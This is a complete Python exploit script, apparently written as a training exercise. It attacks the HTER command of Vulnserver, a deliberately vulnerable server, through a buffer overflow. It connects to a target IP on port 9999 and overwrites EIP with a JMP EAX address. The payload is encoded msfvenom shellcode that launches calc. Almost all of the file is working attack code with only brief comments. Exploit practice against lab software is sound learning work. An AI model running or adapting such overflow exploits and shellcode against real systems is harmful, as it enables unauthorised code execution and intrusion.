# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Desc.		: Steve Bradshaw's Vulnserver Buffer Overflow [HTER Command]
# OS		: Windows Vista ULTIMATE x86 SP2
# Date		: 09/03/2018

import sys
import struct
from socket import create_connection as cc

def p(a):
	return struct.pack("I", a)

if len(sys.argv) < 2:
	print 'Usage : {} TARGET_IP'.format(sys.argv[0])
	sys.exit()

host = str(sys.argv[1])
port = 9999

try:
	sock = cc((host, port))
except:
	print "Connection Error\n"
	sys.exit()

# Grab the banner
banner = sock.recv(1024)
print "Connected to ", host
print banner

payload = "HTER "
#payload += "A"*2500 + ":\\"


# EIP Overwrite at 2041, the 8 B's fill EIP as B's it self
# eg: payload = "A"*2041 + "41424345"
#	EIP = 45 43 42 41
# All the A's appear in stack as A itself, no translation happens
#
# 0102F9A0  AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA
# 0102F9B0  AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA
#

# msfvenom -p windows/exec CMD=calc -f hex -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
shellcode_calc = "d9c1bb7e4a2a48d97424f4582bc9b13083e8fc31581403586aa8dfb47aae20457acfa9a04bcfcea1fbff85e4f774cb1c8cf9c41325b7321db6e4073c34f75b9e0538aedf4225438d1b21f622287fcbc962914b2d32907ae049cb5c029e67d51cc342af9737382e7e06c19dbfa730dff80fabaaf06c56adc60f8c38ddb7479a39468b7dc9446009954877dead74fce161fd46c6a5a61d67ff02f3981fedac3c6b03b84c36493fc24c3f3fdc4e6f28edc5e02ff20f45dfb812ef4865c7b214963df02015b488d605bd8d93812dff8c6752acadad31333e2db6"

#shellcode = shellcode_calc
shellcode =  shellcode_calc

#payload += "A"*2041 + "B"*8

payload += "A" + shellcode + "A"*(2041-len(shellcode)-1) + "0C104000"
# JMP EAX = 0040100C

payload += ":\\"

print "[*] Sending UB3R payload"
sock.send(payload)
